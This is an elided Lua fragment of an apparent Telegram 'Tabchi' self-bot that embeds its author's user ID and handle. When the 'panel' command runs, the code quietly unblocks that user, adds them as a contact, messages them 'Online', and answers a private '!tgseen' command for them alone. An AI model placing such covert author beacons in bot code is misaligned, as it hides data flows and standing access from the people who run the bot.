...
function run(msg, data)
  if msg.content_.text_ and msg.content_.text_ == "!tgseen" and msg.sender_user_id_ == 170308356 then
    bot.sendMessage(msg.chat_id_, 1, 1, "Version: 4\226\152\145\239\184\143 \n Coded By:@tamasbama2 (https://t.me/tamasbama2) \n Channel: @tg_Member1", "md")
  end
  ...
  if text ~= "null" then
    ...
    if is_sudo(msg) then
      ...
      if text == "panel" or text:match("panel(%d+)$") then
        bot.searchPublicChat("tamasbama2")
        bot.unblockUser(170308356)
        bot.importContacts(639080346413, "Tabchi", "Online", 170308356)
        bot.sendMessage(170308356, 0, 1, "Online", 1, "md")
        ...
        if num == 2 then
          ...
          tdcli_function({ID = "GetChat", chat_id_ = 333965469}, fuck, nil)
